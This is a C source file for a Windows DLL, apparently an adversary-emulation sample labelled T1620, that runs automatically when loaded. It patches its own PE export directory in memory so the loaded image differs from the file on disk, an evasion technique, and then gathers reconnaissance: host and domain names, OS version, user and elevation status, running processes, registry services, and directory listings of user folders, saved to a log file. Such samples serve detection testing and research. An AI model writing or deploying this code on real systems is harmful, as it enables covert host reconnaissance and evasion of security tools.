/*
 * CommanderDLL.c — DLL that patches its own EAT at runtime (T1620 V5)
 * and runs host discovery on DLL_PROCESS_ATTACH.
 *
 * EAT patching: fabricates IMAGE_EXPORT_DIRECTORY in-memory at image tail,
 * patches PE data-directory entry to point at it. On-disk and in-memory
 * export tables diverge after load.
 *
 * Discovery output: %LOCALAPPDATA%\commander-dll.log
 *
 * Build (MSVC x64):
 *   cl /LD /Os CommanderDLL.c /Fe:CommanderDLL.dll /link kernel32.lib advapi32.lib shlwapi.lib ntdll.lib
 */

#include <windows.h>
#include <winnt.h>
#include <tlhelp32.h>
#include <shlwapi.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlGetVersion(PRTL_OSVERSIONINFOW);

/* ── EAT patching ─────────────────────────────────────────────────────── */

__declspec(noinline)
static BOOL WINAPI StartRoutine(void) {
    return TRUE;
}

static IMAGE_NT_HEADERS *get_nt_headers(HMODULE hMod) {
    BYTE *base = (BYTE *)hMod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    return (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
}

static BYTE *find_image_tail(HMODULE hMod, IMAGE_NT_HEADERS *nt) {
    BYTE *base = (BYTE *)hMod;
    BYTE *tail = 0;
    for (DWORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER *sec = &IMAGE_FIRST_SECTION(nt)[i];
        BYTE *end = base + sec->VirtualAddress + sec->Misc.VirtualSize;
        if (end > tail) tail = end;
    }
    return tail;
}

static void build_export_directory(HMODULE hMod) {
    BYTE *base = (BYTE *)hMod;
    IMAGE_NT_HEADERS *nt = get_nt_headers(hMod);
#define EAT_BLOCK_SIZE 0x50

    BYTE *tail = find_image_tail(hMod, nt);
    if (!tail) return;

    DWORD oldProtect;
    if (!VirtualProtect(tail, EAT_BLOCK_SIZE, PAGE_READWRITE, &oldProtect)) return;

    BYTE block[EAT_BLOCK_SIZE];
    memset(block, 0, EAT_BLOCK_SIZE);
    DWORD tailRVA = (DWORD)(tail - base);

    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)block;
    exp->Base                  = 1;
    exp->NumberOfFunctions     = 1;
    exp->NumberOfNames         = 1;
    exp->Name                  = tailRVA + 0x32;
    exp->AddressOfFunctions    = tailRVA + 0x28;
    exp->AddressOfNames        = tailRVA + 0x2C;
    exp->AddressOfNameOrdinals = tailRVA + 0x30;

    *(DWORD *)(block + 0x28) = (DWORD)((BYTE *)StartRoutine - base);
    *(DWORD *)(block + 0x2C) = tailRVA + 0x43;
    *(WORD  *)(block + 0x30) = 0;

    memcpy(block + 0x32, "CommanderDll.dll", 17);
    memcpy(block + 0x43, "StartRoutine",     13);

    memmove(tail, block, EAT_BLOCK_SIZE);
    VirtualProtect(tail, EAT_BLOCK_SIZE, oldProtect, &oldProtect);

    IMAGE_DATA_DIRECTORY *exportDD =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    VirtualProtect(exportDD, sizeof(IMAGE_DATA_DIRECTORY), PAGE_READWRITE, &oldProtect);
    exportDD->VirtualAddress = tailRVA;
    exportDD->Size           = EAT_BLOCK_SIZE;
    VirtualProtect(exportDD, sizeof(IMAGE_DATA_DIRECTORY), oldProtect, &oldProtect);
}

/* ── Discovery logging ────────────────────────────────────────────────── */

static char g_log[32768];
static int  g_pos = 0;

static void logstr(const char *s) {
    int i = 0;
    while (s[i] && g_pos < (int)sizeof(g_log) - 1)
        g_log[g_pos++] = s[i++];
}

static void logline(const char *label, const char *value) {
    logstr("  "); logstr(label); logstr(value); logstr("\r\n");
}

static void logint(const char *label, int val) {
    char buf[16];
    wnsprintfA(buf, sizeof(buf), "%d", val);
    logline(label, buf);
}

static void logsection(const char *name) {
    logstr("["); logstr(name); logstr("]\r\n");
}

static void section_profile(void) {
    char buf[256];
    DWORD sz;

    logsection("PROFILE");

    sz = sizeof(buf);
    if (GetComputerNameA(buf, &sz))
        logline("Hostname     : ", buf);

    sz = sizeof(buf);
    if (GetComputerNameExA(ComputerNameDnsDomain, buf, &sz) && sz > 0)
        logline("Domain       : ", buf);

    RTL_OSVERSIONINFOW vi;
    vi.dwOSVersionInfoSize = sizeof(vi);
    if (RtlGetVersion(&vi) == 0) {
        char ver[64];
        wnsprintfA(ver, sizeof(ver), "%d.%d build %d",
            vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
        logline("OS Version   : ", ver);
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    logint("Processors   : ", si.dwNumberOfProcessors);

    BOOL wow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &wow64);
    logline("64-bit OS    : ", wow64 ? "True (WoW64)" : "True");

    logstr("\r\n");
}

static void section_session(void) {
    char buf[256];
    DWORD sz;

    logsection("SESSION");

    sz = sizeof(buf);
    if (GetUserNameA(buf, &sz))
        logline("User         : ", buf);

    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elev;
        DWORD ret;
        if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &ret))
            logline("Elevated     : ", elev.TokenIsElevated ? "True" : "False");
        CloseHandle(hToken);
    }

    logstr("\r\n");
}

static void section_processes(void) {
    logsection("TASKS");
    logstr("  PID      Name\r\n");
    logstr("  ---      ----\r\n");

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        logstr("  Error: CreateToolhelp32Snapshot failed\r\n");
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            char line[300];
            wnsprintfA(line, sizeof(line), "  %-8d %s\r\n",
                pe.th32ProcessID, pe.szExeFile);
            logstr(line);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    logstr("\r\n");
}

static void section_services(void) {
    HKEY hServices;
    logsection("SERVICES");

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Services", 0,
            KEY_READ, &hServices) != 0) {
        logstr("  Unable to open registry key\r\n\r\n");
        return;
    }

    logstr("  Name                                     Start ImagePath\r\n");
    logstr("  ---                                      ----- ---------\r\n");

    char name[256];
    DWORD idx = 0, nameSz;
    while (1) {
        nameSz = sizeof(name);
        if (RegEnumKeyExA(hServices, idx++, name, &nameSz, NULL, NULL, NULL, NULL) != 0)
            break;

        HKEY hSvc;
        if (RegOpenKeyExA(hServices, name, 0, KEY_READ, &hSvc) != 0)
            continue;

        DWORD type = 0, typeSz = sizeof(type);
        RegQueryValueExA(hSvc, "Type", NULL, NULL, (LPBYTE)&type, &typeSz);
        if ((type & 0x30) == 0) {
            RegCloseKey(hSvc);
            continue;
        }

        DWORD start = 0, startSz = sizeof(start);
        RegQueryValueExA(hSvc, "Start", NULL, NULL, (LPBYTE)&start, &startSz);

        char imgPath[128] = "";
        DWORD imgSz = sizeof(imgPath) - 1;
        RegQueryValueExA(hSvc, "ImagePath", NULL, NULL, (LPBYTE)imgPath, &imgSz);

        char line[300];
        if (imgPath[0])
            wnsprintfA(line, sizeof(line), "  %-42s %-5d %s\r\n", name, start, imgPath);
        else
            wnsprintfA(line, sizeof(line), "  %-42s %-5d\r\n", name, start);
        logstr(line);

        RegCloseKey(hSvc);
    }

    RegCloseKey(hServices);
    logstr("\r\n");
}

static void list_dir(const char *path) {
    logstr("  "); logstr(path); logstr(":\r\n");

    char pattern[MAX_PATH];
    wnsprintfA(pattern, sizeof(pattern), "%s\\*", path);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        logstr("    (access denied)\r\n");
        return;
    }
    do {
        if (fd.cFileName[0] == '.' &&
            (fd.cFileName[1] == 0 || (fd.cFileName[1] == '.' && fd.cFileName[2] == 0)))
            continue;
        logstr("    "); logstr(fd.cFileName); logstr("\r\n");
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

static void section_files(void) {
    logsection("FILES");

    list_dir("C:\\Users");
    list_dir("C:\\Windows\\Temp");

    char buf[MAX_PATH];
    DWORD sz = GetEnvironmentVariableA("USERPROFILE", buf, sizeof(buf));
    if (sz > 0 && sz < sizeof(buf)) {
        char desktop[MAX_PATH], docs[MAX_PATH];
        wnsprintfA(desktop, sizeof(desktop), "%s\\Desktop", buf);
        wnsprintfA(docs,    sizeof(docs),    "%s\\Documents", buf);
        list_dir(desktop);
        list_dir(docs);
    }

    logstr("\r\n");
}

static void write_logfile(void) {
    char path[MAX_PATH];
    DWORD sz = GetEnvironmentVariableA("LOCALAPPDATA", path, sizeof(path) - 32);
    if (sz == 0) return;

    wnsprintfA(path + sz, sizeof(path) - sz, "\\commander-dll.log");

    HANDLE hFile = CreateFileA(path,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    DWORD written;
    WriteFile(hFile, g_log, g_pos, &written, NULL);
    CloseHandle(hFile);
}

static void run_discovery(void) {
    g_pos = 0;
    section_profile();
    section_session();
    section_processes();
    section_services();
    section_files();
    write_logfile();
}

/* ── Entry point ──────────────────────────────────────────────────────── */

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        build_export_directory((HMODULE)hinstDLL);
        run_discovery();
    }
    return TRUE;
}
